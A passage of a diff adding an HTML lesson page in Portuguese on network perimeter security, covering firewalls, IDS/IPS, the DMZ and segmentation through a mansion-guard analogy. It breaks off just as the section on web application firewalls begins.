@@ -1,0 +1,1489 @@
+<!DOCTYPE html>
+<html lang="pt-BR" data-theme="light">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Segurança de Perímetro — Material de Apoio</title>
+  
+  <!-- Basecoat CSS -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/basecoat-css@1.0.2/dist/basecoat.cdn.min.css">
+  
+  <!-- Typography: Inter -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap">
+  
+  <!-- System Shell -->
+  <style>
+/* Skip artifact shell — fixed styles served beside every artifact.
+   Complements basecoat; artifacts override --accent for their own identity. */
+:root {
+  color-scheme: light dark;
+  --accent: #2563eb;
+  --accent-contrast: #ffffff;
+  --accent-text: color-mix(in srgb, var(--accent) 72%, #000);
+  --bg: #f8f9fb;
+  --surface: #ffffff;
+  --text: #14171f;
+  --text-muted: #5b6472;
+  --border: rgba(20, 23, 31, 0.10);
+  --radius: 10px;
+  --shadow: 0 1px 3px rgba(20, 23, 31, 0.08);
+  --space: 16px;
+}
+/* Theme resolution. Without data-theme the viewer's system preference decides,
+   as it always did. With it, the artifact's own choice wins in BOTH directions:
+   a page that hardcodes one palette must not be handed the opposite set of
+   tokens by the machine it happens to be opened on. The dark values appear
+   twice because a media query cannot be folded into a selector list.
+   The attribute sits inside :where() so these blocks keep the specificity of a
+   bare :root — the page's own <style> is linked after this file and must go on
+   overriding any token it wants, exactly as it could before. */
+@media (prefers-color-scheme: dark) {
+  :root:where(:not([data-theme="light"])) {
+    --accent-text: color-mix(in srgb, var(--accent) 78%, #fff);
+    --bg: #101318;
+    --surface: #181c23;
+    --text: #eef1f6;
+    --text-muted: #9aa4b2;
+    --border: rgba(238, 241, 246, 0.12);
+    --shadow: 0 1px 3px rgba(0, 0, 0, 0.4);
+  }
+}
+:root:where([data-theme="dark"]) {
+  color-scheme: dark;
+  --accent-text: color-mix(in srgb, var(--accent) 78%, #fff);
+  --bg: #101318;
+  --surface: #181c23;
+  --text: #eef1f6;
+  --text-muted: #9aa4b2;
+  --border: rgba(238, 241, 246, 0.12);
+  --shadow: 0 1px 3px rgba(0, 0, 0, 0.4);
+}
+:root:where([data-theme="light"]) { color-scheme: light; }
+* { box-sizing: border-box; }
+html, body { margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  line-height: 1.55;
+  -webkit-font-smoothing: antialiased;
+}
+img { max-width: 100%; display: block; }
+
+.shell-container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+.shell-section { padding: calc(var(--space) * 2) 0; }
+.shell-grid { display: grid; gap: var(--space); grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
+.shell-toolbar { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: var(--space); }
+.shell-footer { padding: 24px 0 40px; color: var(--text-muted); font-size: 13px; }
+
+.shell-hero { padding: calc(var(--space) * 3) 0 calc(var(--space) * 2); }
+.shell-hero h1 { font-size: clamp(26px, 4vw, 40px); line-height: 1.15; margin: 0 0 10px; text-wrap: balance; }
+.shell-hero p { color: var(--text-muted); max-width: 60ch; margin: 0; }
+
+.panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  padding: var(--space);
+}
+
+.kpi { display: flex; flex-direction: column; gap: 4px; }
+.kpi .kpi-value { font-size: 28px; font-weight: 650; line-height: 1.1; }
+.kpi .kpi-label { font-size: 13px; color: var(--text-muted); }
+.kpi .kpi-delta { font-size: 12.5px; font-weight: 600; }
+.kpi .kpi-delta.up { color: #0a8f3c; }
+.kpi .kpi-delta.down { color: #cf3131; }
+
+table.shell-table { border-collapse: collapse; width: 100%; font-size: 14px; }
+table.shell-table th {
+  text-align: left; font-size: 11.5px; letter-spacing: 0.05em; text-transform: uppercase;
+  color: var(--text-muted); font-weight: 600;
+}
+table.shell-table th, table.shell-table td { padding: 9px 12px 9px 0; border-bottom: 1px solid var(--border); }
+table.shell-table td.num, table.shell-table th.num { text-align: right; font-variant-numeric: tabular-nums; }
+table.shell-table tbody tr:hover { background: color-mix(in srgb, var(--accent) 6%, transparent); }
+
+.chart-box { width: 100%; min-height: 220px; }
+.chart-box svg { width: 100%; height: auto; display: block; }
+
+.muted { color: var(--text-muted); }
+.accent { color: var(--accent-text); }
+.shell-badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  font-size: 12px; font-weight: 600; padding: 3px 10px; border-radius: 999px;
+  background: color-mix(in srgb, var(--accent) 12%, transparent); color: var(--accent-text);
+}
+
+@media (prefers-reduced-motion: no-preference) {
+  .shell-fade { animation: shell-fade 400ms ease both; }
+  @keyframes shell-fade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+}
+
+</style>
+  
+
+  <style>
+    :root {
+      --accent: #1d4ed8;
+      --accent-hover: #1e40af;
+      --code-bg: #0f172a;
+      --code-text: #e2e8f0;
+      --callout-info-bg: #eff6ff;
+      --callout-info-border: #3b82f6;
+      --callout-warn-bg: #fffbeb;
+      --callout-warn-border: #f59e0b;
+      --callout-think-bg: #f5f3ff;
+      --callout-think-border: #8b5cf6;
+      --callout-alert-bg: #fef2f2;
+      --callout-alert-border: #ef4444;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      line-height: 1.75;
+      color: var(--text);
+      background-color: var(--bg);
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Reading Progress Bar */
+    #progress-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #1d4ed8, #0ea5e9);
+      width: 0%;
+      z-index: 1000;
+      transition: width 0.1s ease-out;
+    }
+
+    /* Container for blog article */
+    .article-wrap {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 2.5rem 1.25rem 5rem;
+    }
+
+    /* Header Meta */
+    .meta-badge-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-bottom: 1.25rem;
+    }
+
+    .badge-tag {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 0.25rem 0.65rem;
+      border-radius: 999px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-muted);
+    }
+    .badge-tag.highlight {
+      background: #eff6ff;
+      border-color: #bfdbfe;
+      color: var(--accent-text);
+    }
+
+    .article-title {
+      font-size: 2.4rem;
+      line-height: 1.2;
+      font-weight: 800;
+      letter-spacing: -0.025em;
+      color: #0f172a;
+      margin: 0 0 1rem 0;
+    }
+
+    .article-lead {
+      font-size: 1.2rem;
+      color: var(--text-muted);
+      line-height: 1.6;
+      margin-bottom: 1.75rem;
+    }
+
+    .article-meta-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+      padding: 1rem 1.25rem;
+      background: var(--surface);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      font-size: 0.875rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .meta-author {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .meta-avatar {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: #1e3a8a;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 0.9rem;
+    }
+
+    /* Table of contents card */
+    .toc-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--accent);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      margin-bottom: 3rem;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+    }
+
+    .toc-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-top: 0;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .toc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 0.5rem 1.5rem;
+      margin: 0;
+      padding: 0;
+      list-style: none;
+    }
+
+    .toc-grid a {
+      color: var(--accent-text);
+      text-decoration: none;
+      font-size: 0.9rem;
+      transition: color 0.15s ease;
+      display: block;
+      padding: 0.2rem 0;
+    }
+
+    .toc-grid a:hover {
+      text-decoration: underline;
+      color: var(--accent-hover);
+    }
+
+    /* Content Typography & Elements */
+    .section-title {
+      font-size: 1.65rem;
+      font-weight: 700;
+      color: #0f172a;
+      margin-top: 3.25rem;
+      margin-bottom: 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 2px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      scroll-margin-top: 2rem;
+    }
+
+    .section-subtitle {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-top: 2rem;
+      margin-bottom: 0.75rem;
+      color: #1e293b;
+    }
+
+    p {
+      margin-bottom: 1.25rem;
+      color: #334155;
+    }
+
+    strong {
+      color: #0f172a;
+    }
+
+    /* Callout Boxes */
+    .callout {
+      border-radius: var(--radius);
+      padding: 1.25rem 1.5rem;
+      margin: 1.75rem 0;
+      border-left: 5px solid;
+      background: var(--surface);
+    }
+
+    .callout-info {
+      background-color: var(--callout-info-bg);
+      border-left-color: var(--callout-info-border);
+      color: #1e3a8a;
+    }
+
+    .callout-warn {
+      background-color: var(--callout-warn-bg);
+      border-left-color: var(--callout-warn-border);
+      color: #78350f;
+    }
+
+    .callout-think {
+      background-color: var(--callout-think-bg);
+      border-left-color: var(--callout-think-border);
+      color: #4c1d95;
+    }
+
+    .callout-alert {
+      background-color: var(--callout-alert-bg);
+      border-left-color: var(--callout-alert-border);
+      color: #7f1d1d;
+    }
+
+    .callout-header {
+      font-weight: 700;
+      font-size: 0.95rem;
+      margin-bottom: 0.4rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+    }
+
+    .callout p {
+      margin: 0;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      color: inherit;
+    }
+
+    /* Blockquote */
+    blockquote.narrative-quote {
+      border-left: 4px solid var(--accent);
+      margin: 2rem 0;
+      padding: 1rem 1.5rem;
+      background: #f8fafc;
+      font-style: italic;
+      color: #334155;
+      border-radius: 0 var(--radius) var(--radius) 0;
+    }
+    blockquote.narrative-quote p {
+      margin: 0;
+      font-size: 1.05rem;
+    }
+
+    /* Architecture diagram box */
+    .arch-diagram {
+      background: #0f172a;
+      color: #f8fafc;
+      border-radius: var(--radius);
+      padding: 1.75rem;
+      margin: 2rem 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      overflow-x: auto;
+      line-height: 1.6;
+      border: 1px solid #334155;
+      box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
+    }
+
+    /* Code Snippets */
+    .code-block {
+      background: var(--code-bg);
+      color: var(--code-text);
+      border-radius: var(--radius);
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.875rem;
+      overflow-x: auto;
+      border: 1px solid #1e293b;
+    }
+    .code-block .cmd {
+      color: #38bdf8;
+      font-weight: 600;
+    }
+    .code-block .comment {
+      color: #94a3b8;
+      font-style: italic;
+    }
+    .code-block .flag {
+      color: #f472b6;
+    }
+
+    /* Interactive Component Tabs */
+    .tab-nav {
+      display: flex;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 0.5rem;
+    }
+    .tab-btn {
+      background: transparent;
+      border: none;
+      padding: 0.5rem 1rem;
+      font-weight: 600;
+      font-size: 0.95rem;
+      cursor: pointer;
+      border-radius: 6px;
+      color: var(--text-muted);
+      transition: all 0.2s ease;
+    }
+    .tab-btn.active {
+      background: #eff6ff;
+      color: var(--accent-text);
+    }
+    .tab-pane {
+      display: none;
+    }
+    .tab-pane.active {
+      display: block;
+    }
+
+    /* Feature Grid / Cards */
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 1.25rem;
+      margin: 1.5rem 0 2rem;
+    }
+    .sub-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.25rem;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .sub-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.06);
+    }
+    .sub-card h4 {
+      margin: 0 0 0.5rem 0;
+      font-size: 1.05rem;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+    .sub-card p {
+      font-size: 0.875rem;
+      margin: 0;
+      color: #475569;
+    }
+
+    /* Table styling tweaks */
+    .table-container {
+      overflow-x: auto;
+      margin: 1.75rem 0;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+    }
+    table.study-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.9rem;
+    }
+    table.study-table th {
+      background-color: #f1f5f9;
+      color: #0f172a;
+      font-weight: 700;
+      padding: 0.85rem 1rem;
+      border-bottom: 2px solid var(--border);
+    }
+    table.study-table td {
+      padding: 0.85rem 1rem;
+      border-bottom: 1px solid var(--border);
+      color: #334155;
+      vertical-align: top;
+    }
+    table.study-table tr:last-child td {
+      border-bottom: none;
+    }
+    table.study-table tr:hover {
+      background-color: #f8fafc;
+    }
+
+    /* Action Checklist for Students */
+    .checklist {
+      list-style: none;
+      padding: 0;
+      margin: 1.5rem 0;
+    }
+    .checklist-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin-bottom: 0.6rem;
+    }
+    .checklist-item input[type="checkbox"] {
+      margin-top: 0.3rem;
+      cursor: pointer;
+      width: 18px;
+      height: 18px;
+    }
+    .checklist-item label {
+      cursor: pointer;
+      font-size: 0.92rem;
+      color: #334155;
+    }
+
+    /* Print styling */
+    @media print {
+      #progress-bar, .toc-card, .btn-print, .tab-nav {
+        display: none !important;
+      }
+      body {
+        font-size: 11pt;
+        line-height: 1.5;
+        background: #fff;
+        color: #000;
+      }
+      .article-wrap {
+        max-width: 100%;
+        padding: 0;
+      }
+      .tab-pane {
+        display: block !important;
+      }
+      .section-title {
+        page-break-before: auto;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Dynamic Reading Progress Bar -->
+  <div id="progress-bar" role="progressbar" aria-label="Progresso de leitura"></div>
+
+  <main class="article-wrap">
+    
+    <!-- Top Metadata -->
+    <header>
+
+      <h1 class="article-title">Segurança de Perímetro: A Primeira Linha de Defesa</h1>
+      <p class="article-lead">
+        Da paliçada medieval ao isolamento rigoroso de bancos digitais: como erguer muralhas, portões vigiados e guaritas inteligentes para delimitar, inspecionar e conter o tráfego da nossa infraestrutura.
+      </p>
+
+      <div class="article-meta-bar">
+        <div class="meta-author">
+          <div class="meta-avatar">IFC</div>
+          <div>
+            <strong>Material Didático de Apoio</strong><br>
+          </div>
+        </div>
+        <div>
+          <button class="btn btn-sm btn-outline btn-print" onclick="window.print()">
+            🖨️ Imprimir / Salvar PDF
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <!-- Narrative Anchor Blockquote -->
+    <blockquote class="narrative-quote">
+      <p>
+        <strong>A Narrativa dos Guardiões:</strong> Na Aula anterior, nós nos tornamos o time de elite da segurança patrimonial da histórica mansão do Sinhozinho Malta. Compreendemos a mentalidade Blue Team, o framework NIST CSF, as premissas de Zero Trust e a prontidão do SOC. Hoje, damos o próximo passo: <em>uma vez que já organizamos a estratégia de guarda, agora é hora de cavar o fosso, erguer as muralhas de pedra, calibrar a portaria e guarnecer a guarita de entrada.</em>
+      </p>
+    </blockquote>
+
+    <!-- Table of Contents (Sumário com Âncoras) -->
+    <nav class="toc-card" aria-label="Sumário da Aula">
+      <div class="toc-title">
+        <span>📖</span> Sumário da Aula & Roteiro de Estudo
+      </div>
+      <ul class="toc-grid">
+        <li><a href="#sec-1">1. Introdução: O Perímetro de Segurança</a></li>
+        <li><a href="#sec-2">2. Por que o Perímetro Importa: 4 Missões</a></li>
+        <li><a href="#sec-3">3. Os 6 Componentes Essenciais do Perímetro</a></li>
+        <li><a href="#sec-4">4. Firewall: O Vigia da Fronteira</a></li>
+        <li><a href="#sec-5">5. IDS vs. IPS: O Olheiro e o Interventor</a></li>
+        <li><a href="#sec-6">6. DMZ: A Sala de Espera da Mansão</a></li>
+        <li><a href="#sec-7">7. Segmentação e Microsegmentação</a></li>
+        <li><a href="#sec-8">8. WAF: O Inspetor das Aplicações Web</a></li>
+        <li><a href="#sec-9">9. VPN: A Entrada Secreta e Monitorada</a></li>
+        <li><a href="#sec-10">10. A Evolução do Conceito de Perímetro</a></li>
+        <li><a href="#sec-11">11. Perímetro + Zero Trust + Defesa em Profundidade</a></li>
+        <li><a href="#sec-12">12. Estudo de Caso: Arquitetura Banco Seguro AWS</a></li>
+        <li><a href="#sec-13">13. Prática Guiada: Trilha do Professor</a></li>
+        <li><a href="#sec-14">14. Prática Guiada: Trilha do Aluno</a></li>
+        <li><a href="#sec-15">15. Ferramentas Leves: nmap, Wireshark & Labs</a></li>
+        <li><a href="#sec-16">16. Perigos de um Perímetro Mal Projetado</a></li>
+        <li><a href="#sec-17">17. Fechamento e Micro-tarefa Reflexiva</a></li>
+        <li><a href="#sec-18">18. Conexão com o Portfólio do Curso</a></li>
+      </ul>
+    </nav>
+
+    <!-- SECTION 1 -->
+    <section id="sec-1">
+      <h2 class="section-title">1. Introdução — O que é Perímetro de Segurança</h2>
+      <p>
+        No universo dos sistemas computacionais, denominamos <strong>perímetro de segurança</strong> a fronteira lógica ou física bem delineada que separa o que se convenciona considerar <em>confiável e sob controle interno</em> daquilo que reside no <em>exterior não confiável</em> (como a internet pública ou redes de terceiros).
+      </p>
+      <p>
+        Essa ideia tem raízes seculares na engenharia de fortificações e castelos medievais. Antes de existir artilharia moderna ou redes sem fio, a muralha externa de pedra definia categoricamente o que estava sob custódia da guarnição e o que pertencia aos ermos hostis. A muralha resolvia três necessidades primordiais:
+      </p>
+      <ul>
+        <li>- <strong>Delimitar:</strong> saber com clareza matemática o que está "dentro" e deve ser protegido a todo custo;</li>
+        <li>- <strong>Concentrar controles:</strong> em vez de guardar cada milímetro do território, concentram-se sentinelas em pontos focais de passagem (pontes levadiças, portões com grades levadiças);</li>
+        <li>- <strong>Observar e filtrar:</strong> vistoriar carroças, caravanas e mercadores que cruzam a guarita antes de permitir acesso ao pátio interno.</li>
+      </ul>
+
+      <div class="callout callout-info">
+        <div class="callout-header">📌 Ponto Chave de Doutrina</div>
+        <p>
+          O perímetro é indispensável como <strong>a primeira linha de defesa</strong> da infraestrutura, mas ele <strong>nunca pode ser a única</strong>. Uma propriedade cuja segurança se apoie exclusivamente em um muro alto desmorona no instante em que o portão é transposto.
+        </p>
+      </div>
+    </section>
+
+    <!-- SECTION 2 -->
+    <section id="sec-2">
+      <h2 class="section-title">2. Por que o Perímetro Importa: Os Quatro Trabalhos Vitais</h2>
+      <p>
+        Um arquiteto de defesa cibernética não constrói barreiras ao acaso. O perímetro de rede executa continuamente quatro funções operacionais intransferíveis:
+      </p>
+
+      <div class="card-grid">
+        <div class="sub-card">
+          <h4>🛡️ 1. Reduzir</h4>
+          <p>
+            <strong>Diminui a superfície de ataque.</strong> Ao fechar portas, suspender protocolos arcaicos e descartar pacotes não autorizados, o perímetro restringe drasticamente as janelas de oportunidade que um invasor externo poderia tentar explorar.
+          </p>
+        </div>
+        <div class="sub-card">
+          <h4>👁️ 2. Observar</h4>
+          <p>
+            <strong>Concentra tráfego para telemetria.</strong> Ao forçar as conexões a transitarem por pontos de estrangulamento vigiados (choke points), viabiliza a geração de logs ricos, telemetria de fluxo (NetFlow/IPFIX) e análise de anomalias.
+          </p>
+        </div>
+        <div class="sub-card">
+          <h4>🚧 3. Controlar</h4>
+          <p>
+            <strong>Aplica políticas pré-conexão.</strong> Regras rigorosas de filtragem determinam quem entra, sob quais circunstâncias, em quais portas e sob quais protocolos antes mesmo que qualquer pacote toque o ativo final.
+          </p>
+        </div>
+        <div class="sub-card">
+          <h4>🚨 4. Alertar</h4>
+          <p>
+            <strong>Gera os primeiros sinais de intrusão.</strong> Varrer portas (port scan), disparar ataques volumétricos de força bruta ou disparar sondagens maliciosas acendem as luzes de alarme na guarita antes que danos reais ocorram.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 3 -->
+    <section id="sec-3">
+      <h2 class="section-title">3. Componentes do Perímetro — Visão Geral dos Seis Pilares</h2>
+      <p>
+        Uma guarita moderna não é composta por um único sentinela solitário. O perímetro cibernético articula seis tecnologias complementares:
+      </p>
+      <div class="table-container">
+        <table class="study-table">
+          <thead>
+            <tr>
+              <th>Componente</th>
+              <th>Função Primária de Segurança</th>
+              <th>Analogia Patrimonial</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Firewall</strong></td>
+              <td>Filtra o fluxo de conexões com base em regras preestabelecidas (IP, porta, estado, protocolo).</td>
+              <td>A guarita com a cancela e a lista oficial de placas e visitantes autorizados.</td>
+            </tr>
+            <tr>
+              <td><strong>IDS / IPS</strong></td>
+              <td>Inspeciona assinaturas de ameaças e anomalias; o IDS avisa, o IPS bloqueia em tempo real.</td>
+              <td>O cão de guarda treinado (fareja comportamentos furtivos) e o guarda armado de resposta imediata.</td>
+            </tr>
+            <tr>
+              <td><strong>DMZ</strong></td>
+              <td>Isola serviços com exposição pública da rede interna confidencial.</td>
+              <td>A antessala de recepção: recebe fornecedores externos sem dar passe livre para a residência privada.</td>
+            </tr>
+            <tr>
+              <td><strong>Segmentação</strong></td>
+              <td>Divide a rede interna em compartimentos estanques com barreiras internas.</td>
+              <td>Portas blindadas internas entre alas; chave mestra não existe, cada sala tem sua tranca.</td>
+            </tr>
+            <tr>
+              <td><strong>WAF</strong></td>
+              <td>Inspeciona minuciosamente requisições em nível de camada 7 (HTTP/HTTPS) contra ataques web.</td>
+              <td>O detector de metais e raio-X minucioso de correspondências e encomendas na portaria.</td>
+            </tr>
+            <tr>
+              <td><strong>VPN</strong></td>
+              <td>Cria túneis criptografados seguros para tráfego remoto autorizado sobre redes inóspitas.</td>
+              <td>O comboio de escolta blindada que traz o guarda ou funcionário com trânsito protegido pela via pública.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- SECTION 4 -->
+    <section id="sec-4">
+      <h2 class="section-title">4. Firewall — O Vigia da Fronteira</h2>
+      <p>
+        O <strong>Firewall</strong> é o componente de decisão: ele analisa o tráfego que tenta atravessar a fronteira da rede e decreta se cada conexão é permitida (<em>ACCEPT/PERMIT</em>) ou descartada (<em>DROP/REJECT</em>). Essa decisão tem base em tuplas clássicas de parâmetros: <code>IP de Origem</code>, <code>IP de Destino</code>, <code>Porta de Origem</code>, <code>Porta de Destino</code>, <code>Protocolo (TCP, UDP, ICMP)</code> e contexto de estado.
+      </p>
+
+      <h3 class="section-subtitle">As Três Gerações de Filtragem:</h3>
+      <ul>
+        <li>
+          <strong>Filtragem de Pacotes Stateless (1ª Geração):</strong> Avalia cada pacote isoladamente com base unicamente no cabeçalho. Não sabe se aquele pacote faz parte de uma conversa já estabelecida. É como um porteiro com amnésia que pede a credencial a cada passo do mesmo visitante.
+        </li>
+        <li>
+          <strong>Firewall de Inspeção com Estado / Stateful (2ª Geração):</strong> Mantém uma tabela de conexões ativas (<em>State Table</em>). Se uma máquina interna iniciou uma requisição legítima para a web (porta 443), o firewall permite a volta dos pacotes correspondentes automaticamente, bloqueando tentativas de entrada iniciadas de fora sem requisição prévia.
+        </li>
+        <li>
+          <strong>Next-Generation Firewall (NGFW) & Proxy de Aplicação (3ª Geração):</strong> Vai até a camada de aplicação (L7). Inspeciona o conteúdo, identifica aplicações mesmo que estejam mascaradas em portas não convencionais (ex: BitTorrent rodando na porta 80/443), integra-se com autenticação de usuários (Active Directory/IAM) e aplica antivírus de fluxo.
+        </li>
+      </ul>
+
+      <div class="callout callout-info">
+        <div class="callout-header">📢 Nota</div>
+        <p>
+          O detalhamento operacional de tabelas de regras (<em>iptables</em>, <em>nftables</em>, security groups e sintaxes de prioridade de política) será objeto de uma <strong>aula prática dedicada exclusivamente a Firewalls</strong> na próxima etapa da nossa jornada.
+        </p>
+      </div>
+    </section>
+
+    <!-- SECTION 5 -->
+    <section id="sec-5">
+      <h2 class="section-title">5. IDS e IPS — O Olheiro e o Interventor</h2>
+      <p>
+        Embora um firewall seja excepcional para autorizar ou barrar conexões com base em portas e IPs, ele muitas vezes é cego para o que trafega <em>dentro</em> de uma porta legitimamente aberta (por exemplo, um ataque transmitido dentro de uma sessão web na porta 443). É aqui que entram os sistemas de inspeção profunda:
+      </p>
+
+      <div class="table-container">
+        <table class="study-table">
+          <thead>
+            <tr>
+              <th>Critério</th>
+              <th>IDS (Intrusion Detection System)</th>
+              <th>IPS (Intrusion Prevention System)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Posicionamento</strong></td>
+              <td><em>Out-of-band</em> (passivo, conectado a uma porta SPAN / espelhamento de tráfego).</td>
+              <td><em>In-line</em> (ativo, o tráfego obrigatoriamente passa por dentro dele).</td>
+            </tr>
+            <tr>
+              <td><strong>Ação Operacional</strong></td>
+              <td>Analisa cópias dos pacotes, detecta padrões suspeitos e despacha alertas ao SOC/SIEM. Não bloqueia.</td>
+              <td>Inspeciona o pacote em tempo real; caso identifique ameaça, descarta imediatamente o pacote (drop) ou encerra a sessão TCP (reset).</td>
+            </tr>
+            <tr>
+              <td><strong>Impacto de Falha</strong></td>
+              <td>Se cair ou congelar, o fluxo de tráfego real não é interrompido (fail-open por natureza da cópia).</td>
+              <td>Se sobrecarregar ou falhar, pode interromper o tráfego corporativo legítimo (risco de indisponibilidade).</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout callout-think">
+        <div class="callout-header">🤔 Para Pensar: O Dilema Operacional do Falso Positivo</div>
+        <p>
+          Qual é o custo de um <strong>falso positivo</strong> em um IDS versus em um IPS? No IDS, um falso positivo resulta em um analista do SOC investigando um alerta improdutivo. No IPS operando em linha, um falso positivo significa que a transação bancária do cliente ou o processamento de folha de pagamento foi <em>bloqueado silenciosamente na guarita</em>, derrubando o negócio! Por isso, equipes de defesa costumam maturar as regras em modo IDS (alerta) antes de promover para IPS (bloqueio).
+        </p>
+      </div>
+    </section>
+
+    <!-- SECTION 6 -->
+    <section id="sec-6">
+      <h2 class="section-title">6. DMZ (Zona Desmilitarizada) — A Sala de Espera da Mansão</h2>
+      <p>
+        Em qualquer organização moderna, certos servidores precisam atender visitantes externos: servidores web (HTTP/HTTPS), servidores de DNS autoritativo, gateways de e-mail (SMTP) e endpoints públicos de API.
+      </p>
+      <p>
+        Se colocarmos esses servidores diretamente na rede interna, qualquer comprometimento neles dará acesso imediato aos bancos de dados e estações dos executivos. Se os colocarmos sem barreira, estarão indefesos. A solução arquitetural é a <strong>DMZ (Demilitarized Zone)</strong>.
+      </p>
+
+      <div class="callout callout-warn">
+        <div class="callout-header">🏰 A Analogia da Mansão: A Antessala de Recepção</div>
+        <p>
+          Imagine a residência do Sinhozinho Malta. Quando um entregador de suprimentos, mensageiro ou fornecedor externo chega, ele não é conduzido à sala de jantar, muito menos ao escritório privado onde fica o cofre de barras de ouro. Ele é atendido em um <strong>espaço intermediário isolado (a recepção da portaria)</strong>. Se aquele visitante for na verdade um ladrão disfarçado que saqueia a antessala, ele ainda assim <em>não tem a chave da porta interna</em> que leva aos aposentos da mansão.
+        </p>
+      </div>
+
+      <p>
+        <strong>A regra cardeal da DMZ:</strong> O tráfego pode fluir da Internet para a DMZ (sob inspeção estrita); a rede interna pode iniciar conexões para a DMZ para administração; <strong>mas servidores da DMZ jamais devem ter permissão de iniciar conexões livres em direção à rede interna</strong>. Caso um web server seja dominado via RCE (Remote Code Execution), o atacante encontra portas fechadas para avançar internamente.
+      </p>
+    </section>
+
+    <!-- SECTION 7 -->
+    <section id="sec-7">
+      <h2 class="section-title">7. Segmentação de Rede — "Uma Chave Não Abre a Casa Inteira"</h2>
+      <p>
+        Uma das falhas defensivas mais catastróficas é a chamada <strong>rede plana (flat network)</strong>, na qual todos os computadores, servidores, câmeras IP e impressoras dividem o mesmo domínio de broadcast e a mesma faixa de IP sem qualquer barreira entre eles.
+      </p>
+      <p>
+        A <strong>segmentação</strong> consiste em fracionar a rede em sub-redes isoladas (VLANs lógicas ou subnets em nuvem) conectadas por roteadores com controle de acesso rigoroso. Já a <strong>microsegmentação</strong> leva esse isolamento ao nível cirúrgico: regras de segurança no próprio hypervisor ou sistema operacional que impedem inclusive que dois servidores vizinhos no mesmo rack troquem dados a não ser que haja justificativa explícita.
+      </p>
+
+      <div class="card-grid">
+        <div class="sub-card">
+          <h4>🚫 Barreira ao Movimento Lateral</h4>
+          <p>Se a estação de trabalho de um analista júnior for infectada por um ransomware via phishing, a segmentação impede que o malware propague varreduras SMB automáticas para a sub-rede do banco de dados financeiro.</p>
+        </div>
+        <div class="sub-card">
+          <h4>🗝️ Privilégio Mínimo de Conexão</h4>
+          <p>Uma chave específica abre apenas a sala do arquivo de documentos. O visitante autorizado a entrar na cozinha não possui permissão para inspecionar o painel elétrico principal.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 8 -->
+    <section id="sec-8">
